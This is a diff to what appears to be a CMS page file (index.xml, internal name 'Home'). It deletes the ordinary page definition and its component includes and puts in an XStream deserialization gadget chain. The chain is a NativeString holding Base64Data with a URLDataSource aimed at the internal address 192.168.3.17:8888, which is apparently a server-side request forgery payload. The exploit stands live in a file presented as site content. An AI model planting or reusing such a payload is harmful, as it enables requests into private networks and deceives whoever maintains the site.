@@ -1,34 +1,19 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<page>
-	<content-type>/page/entry-page</content-type>	<display-template>/templates/web/entry.ftl</display-template>
-	<merge-strategy>inherit-levels</merge-strategy>
-	<placeInNav>false</placeInNav>
-	<file-name>index.xml</file-name>
-	<internal-name>Home</internal-name>
-	<orderDefault_f>-1</orderDefault_f>
-	<objectGroupId>8d7f</objectGroupId>
-	<objectId>8d7f21fa-5e09-00aa-8340-853b7db302da</objectId>
-	<folder-name/>
-	<createdDate>2017-1-31T16:18:14.000Z</createdDate>
-	<createdDate_dt>2017-1-31T16:18:14.000Z</createdDate_dt>
-	<lastModifiedDate>2017-12-20T17:56:21.000Z</lastModifiedDate>
-	<lastModifiedDate_dt>2017-12-20T17:56:21.000Z</lastModifiedDate_dt>
-	<childContent_o>	<item>	<key>/site/components/home/home.xml</key>
-	<value>home</value>
-	<include>/site/components/home/home.xml</include>
-	<disableFlattening>false</disableFlattening>
-	</item>	<item>	<key>/site/components/home/about.xml</key>
-	<value>about</value>
-	<include>/site/components/home/about.xml</include>
-	<disableFlattening>false</disableFlattening>
-	</item>	<item>	<key>/site/components/home/gallery.xml</key>
-	<value>gallery</value>
-	<include>/site/components/home/gallery.xml</include>
-	<disableFlattening>false</disableFlattening>
-	</item>	<item>	<key>/site/components/home/contact.xml</key>
-	<value>contact</value>
-	<include>/site/components/home/contact.xml</include>
-	<disableFlattening>false</disableFlattening>
-	</item></childContent_o>
-	<showCopyright_b>true</showCopyright_b>
-</page>
+<map>
+	<version>2</version>
+   <entry>
+      <jdk.nashorn.internal.objects.NativeString>
+         <flags>0</flags>
+         <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+            <dataHandler>
+               <dataSource class="javax.activation.URLDataSource">
+                  <url>http://192.168.3.17:8888/internal/:</url>
+               </dataSource>
+               <transferFlavors/>
+            </dataHandler>
+            <dataLen>0</dataLen>
+         </value>
+      </jdk.nashorn.internal.objects.NativeString>
+      <string>test</string>
+   </entry>
+</map>
